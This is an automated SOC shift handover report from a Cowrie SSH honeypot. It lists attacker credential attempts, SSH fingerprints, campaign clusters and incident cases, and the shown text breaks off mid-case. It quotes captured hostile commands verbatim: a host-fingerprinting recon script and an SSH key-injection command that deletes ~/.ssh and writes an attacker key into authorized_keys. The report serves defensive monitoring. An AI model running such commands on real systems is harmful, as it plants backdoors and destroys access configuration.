# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-10 |
| **Generated At** | 2026-07-10T19:39:21Z |
| **Shift Time** | 19:39 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **393** |
| Confirmed Threats | **376** |
| False Positives Filtered | **17** (4.3%) |
| Unique Attacker IPs | **97** |
| Countries of Origin | **31** |
| High Severity Cases | **137** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **256** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **163** |
| Unique Credential Pairs | **88** |
| Unique Usernames | **20** |
| Unique Passwords | **74** |
| Successful Auth Pairs | **146** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 69 |
| `admin` | 16 |
| `345gs5662d34` | 11 |
| `support` | 10 |
| `unknown` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 11 |
| `3245gs5662d34` | 11 |
| `uucp` | 5 |
| `unknown2020` | 5 |
| `111111` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 11 |
| `root` | `3245gs5662d34` | 5 |
| `uucp` | `uucp` | 5 |
| `unknown` | `unknown2020` | 5 |
| `root` | `111111` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-10T16:55:20 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-10T16:55:20 |
| `root` | `qwerty24` | `106.13.46.38` | 2026-07-10T16:57:34 |
| `345gs5662d34` | `345gs5662d34` | `106.13.46.38` | 2026-07-10T16:57:41 |
| `root` | `3245gs5662d34` | `106.13.46.38` | 2026-07-10T16:57:45 |
| `root` | `123qwerty` | `195.178.110.232` | 2026-07-10T16:59:30 |
| `support` | `support` | `176.53.159.196` | 2026-07-10T17:00:00 |
| `user` | `123123123a` | `219.144.16.16` | 2026-07-10T17:00:59 |
| `user` | `123123123a` | `118.45.113.140` | 2026-07-10T17:01:08 |
| `support` | `support` | `10.0.0.73` | 2026-07-10T17:01:19 |
| `root` | `21` | `195.178.110.232` | 2026-07-10T17:01:34 |
| `support` | `abcdefgh` | `181.48.97.163` | 2026-07-10T17:01:39 |
| `support` | `abcdefgh` | `176.12.132.63` | 2026-07-10T17:01:47 |
| `root` | `321` | `195.178.110.232` | 2026-07-10T17:03:48 |
| `root` | `4321` | `195.178.110.232` | 2026-07-10T17:06:05 |
| `root` | `victoria` | `185.242.3.195` | 2026-07-10T17:06:06 |
| `root` | `Woaini123.` | `139.59.208.225` | 2026-07-10T17:06:44 |
| `345gs5662d34` | `345gs5662d34` | `139.59.208.225` | 2026-07-10T17:06:46 |
| `root` | `3245gs5662d34` | `139.59.208.225` | 2026-07-10T17:06:47 |
| `root` | `54321` | `195.178.110.232` | 2026-07-10T17:08:21 |
| `user` | `123456789123456789` | `10.0.0.73` | 2026-07-10T17:09:08 |
| `admin` | `admin444` | `27.107.102.154` | 2026-07-10T17:10:08 |
| `admin` | `admin444` | `211.253.10.61` | 2026-07-10T17:10:17 |
| `root` | `P4ssw0rd` | `195.178.110.232` | 2026-07-10T17:10:27 |
| `admin` | `admin444` | `10.0.0.73` | 2026-07-10T17:10:36 |
| `root` | `victoria` | `10.0.0.73` | 2026-07-10T17:11:56 |
| `root` | `P4ssword` | `195.178.110.232` | 2026-07-10T17:12:34 |
| `root` | `P@ssw0rd` | `195.178.110.232` | 2026-07-10T17:14:40 |
| `root` | `Passw0rd` | `195.178.110.232` | 2026-07-10T17:16:44 |
| `root` | `letmein` | `195.178.110.232` | 2026-07-10T17:18:54 |
| `root` | `p4ssword` | `195.178.110.232` | 2026-07-10T17:20:57 |
| `root` | `p@ssw0rd` | `195.178.110.232` | 2026-07-10T17:22:58 |
| `guest` | `123123` | `51.116.117.203` | 2026-07-10T17:23:02 |
| `guest` | `123123` | `49.124.153.44` | 2026-07-10T17:23:16 |
| `uucp` | `uucp` | `182.75.197.174` | 2026-07-10T17:23:18 |
| `uucp` | `uucp` | `91.219.196.17` | 2026-07-10T17:23:26 |
| `root` | `omgpop` | `185.242.3.195` | 2026-07-10T17:23:46 |
| `root` | `passw0rd` | `195.178.110.232` | 2026-07-10T17:24:57 |
| `debian` | `123456` | `10.0.0.73` | 2026-07-10T17:26:40 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-10T17:26:43 |
| `debian` | `3245gs5662d34` | `10.0.0.73` | 2026-07-10T17:26:44 |
| `uucp` | `uucp` | `178.178.222.57` | 2026-07-10T17:26:44 |
| `uucp` | `uucp` | `221.120.4.61` | 2026-07-10T17:26:54 |
| `root` | `password` | `195.178.110.232` | 2026-07-10T17:27:01 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-07-10T17:27:09 |
| `root` | `qwerty` | `195.178.110.232` | 2026-07-10T17:29:00 |
| `root` | `Francis@123` | `64.89.161.90` | 2026-07-10T17:30:28 |
| `admin` | `password` | `64.89.161.90` | 2026-07-10T17:30:31 |
| `root` | `` | `64.89.161.90` | 2026-07-10T17:30:44 |
| `admin` | `1234567890` | `64.89.161.90` | 2026-07-10T17:30:48 |
| `user` | `1984` | `103.174.80.40` | 2026-07-10T17:30:58 |
| `root` | `adminpass` | `64.89.161.90` | 2026-07-10T17:31:04 |
| `operator` | `operator123456789` | `78.189.17.35` | 2026-07-10T17:32:11 |
| `operator` | `operator123456789` | `58.245.210.70` | 2026-07-10T17:32:20 |
| `root` | `root1` | `195.178.110.232` | 2026-07-10T17:32:48 |
| `user` | `1984` | `213.230.65.53` | 2026-07-10T17:34:09 |
| `user` | `1984` | `80.233.77.136` | 2026-07-10T17:34:21 |
| `user` | `1984` | `10.0.0.73` | 2026-07-10T17:34:36 |
| `root` | `root12` | `195.178.110.232` | 2026-07-10T17:34:49 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-10T17:35:48 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-10T17:35:49 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-10T17:35:53 |
| `operator` | `operator123456789` | `10.0.0.73` | 2026-07-10T17:36:05 |
| `root` | `root123` | `195.178.110.232` | 2026-07-10T17:37:20 |
| `root` | `root2026` | `195.178.110.232` | 2026-07-10T17:39:50 |
| `root` | `mike` | `43.132.150.89` | 2026-07-10T17:40:34 |
| `345gs5662d34` | `345gs5662d34` | `43.132.150.89` | 2026-07-10T17:40:38 |
| `root` | `3245gs5662d34` | `43.132.150.89` | 2026-07-10T17:40:39 |
| `root` | `welcome` | `195.178.110.232` | 2026-07-10T17:41:51 |
| `admin` | `123456` | `195.178.110.232` | 2026-07-10T17:43:47 |
| `root` | `omgpop` | `10.0.0.73` | 2026-07-10T17:45:23 |
| `admin` | `123qwe` | `195.178.110.232` | 2026-07-10T17:45:40 |
| `admin` | `123qwerty` | `195.178.110.232` | 2026-07-10T17:47:28 |
| `unknown` | `8888888888` | `111.193.181.226` | 2026-07-10T17:47:51 |
| `support` | `root123456789` | `93.177.157.179` | 2026-07-10T17:48:14 |
| `support` | `root123456789` | `65.20.211.96` | 2026-07-10T17:48:22 |
| `admin` | `21` | `195.178.110.232` | 2026-07-10T17:49:22 |
| `unknown` | `8888888888` | `81.214.75.248` | 2026-07-10T17:51:20 |
| `admin` | `321` | `195.178.110.232` | 2026-07-10T17:51:27 |
| `unknown` | `8888888888` | `211.104.166.110` | 2026-07-10T17:51:29 |
| `support` | `root123456789` | `31.173.0.46` | 2026-07-10T17:51:48 |
| `support` | `root123456789` | `10.0.0.73` | 2026-07-10T17:52:08 |
| `admin` | `654321` | `195.178.110.232` | 2026-07-10T17:53:57 |
| `unknown` | `unknown2020` | `65.20.141.202` | 2026-07-10T17:56:05 |
| `admin` | `P@ssw0rd` | `195.178.110.232` | 2026-07-10T17:56:15 |
| `nagios` | `Nagios123` | `185.242.3.195` | 2026-07-10T17:57:12 |
| `admin` | `admin` | `144.225.6.82` | 2026-07-10T17:57:30 |
| `operator` | `121212` | `65.20.146.109` | 2026-07-10T17:57:31 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-10T17:57:31 |
| `operator` | `121212` | `102.211.7.162` | 2026-07-10T17:57:37 |
| `admin` | `Password` | `195.178.110.232` | 2026-07-10T17:58:03 |
| `unknown` | `unknown2020` | `182.76.36.62` | 2026-07-10T17:59:37 |
| `unknown` | `unknown2020` | `178.178.194.134` | 2026-07-10T17:59:45 |
| `admin` | `admin` | `195.178.110.232` | 2026-07-10T17:59:53 |
| `unknown` | `unknown2020` | `10.0.0.73` | 2026-07-10T17:59:57 |
| `root` | `qmailp` | `45.198.224.120` | 2026-07-10T18:04:36 |
| `ubuntu` | `ubuntu` | `106.12.38.73` | 2026-07-10T18:04:58 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-10T18:09:38 |
| `supervisor` | `supervisor77` | `112.30.127.9` | 2026-07-10T18:12:26 |
| `root` | `102030` | `128.185.220.90` | 2026-07-10T18:13:26 |
| `root` | `102030` | `10.0.0.73` | 2026-07-10T18:17:14 |
| `root` | `qwer1234.` | `45.198.224.120` | 2026-07-10T18:18:37 |
| `nagios` | `Nagios123` | `10.0.0.73` | 2026-07-10T18:19:27 |
| `default` | `root` | `178.178.194.135` | 2026-07-10T18:23:20 |
| `centos` | `centos1234` | `65.20.149.239` | 2026-07-10T18:24:57 |
| `centos` | `centos1234` | `218.94.115.164` | 2026-07-10T18:25:05 |
| `centos` | `centos1234` | `10.0.0.73` | 2026-07-10T18:25:23 |
| `default` | `root` | `14.194.128.158` | 2026-07-10T18:26:40 |
| `default` | `root` | `36.153.164.122` | 2026-07-10T18:26:54 |
| `root` | `qwsazx12` | `45.198.224.120` | 2026-07-10T18:31:25 |
| `arm` | `12345` | `103.143.238.100` | 2026-07-10T18:31:37 |
| `345gs5662d34` | `345gs5662d34` | `103.143.238.100` | 2026-07-10T18:31:39 |
| `arm` | `3245gs5662d34` | `103.143.238.100` | 2026-07-10T18:31:40 |
| `root` | `jobandtalent` | `185.242.3.195` | 2026-07-10T18:31:56 |
| `devil` | `devil` | `34.40.145.110` | 2026-07-10T18:34:58 |
| `345gs5662d34` | `345gs5662d34` | `34.40.145.110` | 2026-07-10T18:35:01 |
| `devil` | `3245gs5662d34` | `34.40.145.110` | 2026-07-10T18:35:03 |
| `root` | `Asdf2024` | `40.82.214.8` | 2026-07-10T18:36:15 |
| `345gs5662d34` | `345gs5662d34` | `40.82.214.8` | 2026-07-10T18:36:19 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-07-10T18:36:21 |
| `root` | `111111` | `125.20.207.154` | 2026-07-10T18:39:09 |
| `osmanatmc` | `Acamtanamso1` | `24.187.213.29` | 2026-07-10T18:40:42 |
| `osmanatmc` | `Acamtanamso1` | `185.2.228.48` | 2026-07-10T18:40:49 |
| `anaconda` | `123456` | `41.93.82.201` | 2026-07-10T18:41:56 |
| `345gs5662d34` | `345gs5662d34` | `41.93.82.201` | 2026-07-10T18:42:01 |
| `anaconda` | `3245gs5662d34` | `41.93.82.201` | 2026-07-10T18:42:03 |
| `root` | `111111` | `138.219.13.21` | 2026-07-10T18:42:46 |
| `root` | `111111` | `196.188.187.205` | 2026-07-10T18:42:59 |
| `root` | `111111` | `10.0.0.73` | 2026-07-10T18:43:14 |
| `root` | `123456aB` | `14.103.118.121` | 2026-07-10T18:44:01 |
| `345gs5662d34` | `345gs5662d34` | `14.103.118.121` | 2026-07-10T18:44:05 |
| `root` | `3245gs5662d34` | `14.103.118.121` | 2026-07-10T18:44:07 |
| `root` | `rootteam` | `45.198.224.120` | 2026-07-10T18:45:16 |
| `root` | `Vision` | `220.178.246.43` | 2026-07-10T18:47:11 |
| `root` | `Vision` | `14.54.22.11` | 2026-07-10T18:47:20 |
| `debian` | `temppwd` | `209.99.190.200` | 2026-07-10T18:47:35 |
| `345gs5662d34` | `345gs5662d34` | `209.99.190.200` | 2026-07-10T18:47:37 |
| `debian` | `3245gs5662d34` | `209.99.190.200` | 2026-07-10T18:47:38 |
| `root` | `q1w2e3!@#` | `185.242.3.195` | 2026-07-10T18:50:10 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-10T18:52:00 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-10T18:52:00 |
| `default` | `default11` | `24.142.170.231` | 2026-07-10T18:52:21 |
| `tester` | `1` | `103.189.234.96` | 2026-07-10T18:52:34 |
| `345gs5662d34` | `345gs5662d34` | `103.189.234.96` | 2026-07-10T18:52:38 |
| `tester` | `3245gs5662d34` | `103.189.234.96` | 2026-07-10T18:52:40 |
| `default` | `default11` | `10.0.0.73` | 2026-07-10T18:52:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **393** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 47 |
| OpenSSH | 44 |
| libssh | 43 |
| Paramiko (Python) | 12 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 44 | 43 |
| `2ec37a7cc8da...` | Mirai/variant | 31 | 1 |
| `f555226df196...` | Mirai/variant | 31 | 11 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `16443846184e...` | Generic scanner | 12 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 44 | 43 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 31 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 31 | 11 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 12 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `4ed0d5b0dc3b...` | libssh | 5 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 29 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.13.46.38`, `41.93.82.201`, `103.143.238.100`, `40.82.214.8`, `209.99.190.200`, `43.132.150.89`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **97** |
| Unique ASNs | **62** |
| High-Risk ASNs | **53** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 5 | MEDIUM |
| `AS25159` | PJSC MegaFon | 4 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (137)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-28afda574a27

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 16:55 |
| **Last Seen** | 2026-07-10 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:55:20` | `cowrie.session.connect` |
| `2026-07-10 16:55:20` | `cowrie.client.version` |
| `2026-07-10 16:55:20` | `cowrie.client.kex` |
| `2026-07-10 16:55:20` | `cowrie.login.success` |
| `2026-07-10 16:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a5339d77bfe

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-10 16:55 |
| **Last Seen** | 2026-07-10 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:55:20` | `cowrie.session.connect` |
| `2026-07-10 16:55:20` | `cowrie.client.version` |
| `2026-07-10 16:55:20` | `cowrie.client.kex` |
| `2026-07-10 16:55:20` | `cowrie.login.success` |
| `2026-07-10 16:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-167b8f42dd69

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-07-10 16:57 |
| **Last Seen** | 2026-07-10 16:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:57:32` | `cowrie.session.connect` |
| `2026-07-10 16:57:32` | `cowrie.client.version` |
| `2026-07-10 16:57:32` | `cowrie.client.kex` |
| `2026-07-10 16:57:34` | `cowrie.login.success` |
| `2026-07-10 16:57:36` | `cowrie.session.params` |
| `2026-07-10 16:57:36` | `cowrie.command.input` |
| `2026-07-10 16:57:36` | `cowrie.command.failed` |
| `2026-07-10 16:57:37` | `cowrie.log.closed` |
| `2026-07-10 16:57:38` | `cowrie.session.params` |
| `2026-07-10 16:57:38` | `cowrie.command.input` |
| `2026-07-10 16:57:38` | `cowrie.session.file_download` |
| `2026-07-10 16:57:38` | `cowrie.log.closed` |
| `2026-07-10 16:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-975657d1c34f

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-07-10 16:57 |
| **Last Seen** | 2026-07-10 16:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:57:39` | `cowrie.session.connect` |
| `2026-07-10 16:57:39` | `cowrie.client.version` |
| `2026-07-10 16:57:39` | `cowrie.client.kex` |
| `2026-07-10 16:57:41` | `cowrie.login.success` |
| `2026-07-10 16:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b76668020e8b

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-07-10 16:57 |
| **Last Seen** | 2026-07-10 16:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:57:42` | `cowrie.session.connect` |
| `2026-07-10 16:57:42` | `cowrie.client.version` |
| `2026-07-10 16:57:43` | `cowrie.client.kex` |
| `2026-07-10 16:57:45` | `cowrie.login.success` |
| `2026-07-10 16:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82ca5af9c18e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 16:59 |
| **Last Seen** | 2026-07-10 16:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:59:29` | `cowrie.session.connect` |
| `2026-07-10 16:59:29` | `cowrie.client.version` |
| `2026-07-10 16:59:29` | `cowrie.client.kex` |
| `2026-07-10 16:59:30` | `cowrie.login.success` |
| `2026-07-10 16:59:32` | `cowrie.session.params` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.success` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:32` | `cowrie.command.input` |
| `2026-07-10 16:59:33` | `cowrie.log.closed` |
| `2026-07-10 16:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5bf2090ee18

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 16:59 |
| **Last Seen** | 2026-07-10 17:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 16:59:59` | `cowrie.session.connect` |
| `2026-07-10 16:59:59` | `cowrie.client.version` |
| `2026-07-10 16:59:59` | `cowrie.client.kex` |
| `2026-07-10 17:00:00` | `cowrie.login.success` |
| `2026-07-10 17:00:00` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:00:00` | `cowrie.direct-tcpip.data` |
| `2026-07-10 17:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-206426427a7a

| Field | Detail |
|---|---|
| **Source IP** | `219.144.16[.]16` |
| **First Seen** | 2026-07-10 17:00 |
| **Last Seen** | 2026-07-10 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:00:56` | `cowrie.session.connect` |
| `2026-07-10 17:00:56` | `cowrie.client.version` |
| `2026-07-10 17:00:56` | `cowrie.client.kex` |
| `2026-07-10 17:00:59` | `cowrie.login.success` |
| `2026-07-10 17:00:59` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.16[.]16` to AbuseIPDB if not already reported
- [ ] Block `219.144.16[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296a8ba165d6

| Field | Detail |
|---|---|
| **Source IP** | `118.45.113[.]140` |
| **First Seen** | 2026-07-10 17:01 |
| **Last Seen** | 2026-07-10 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:01:05` | `cowrie.session.connect` |
| `2026-07-10 17:01:06` | `cowrie.client.version` |
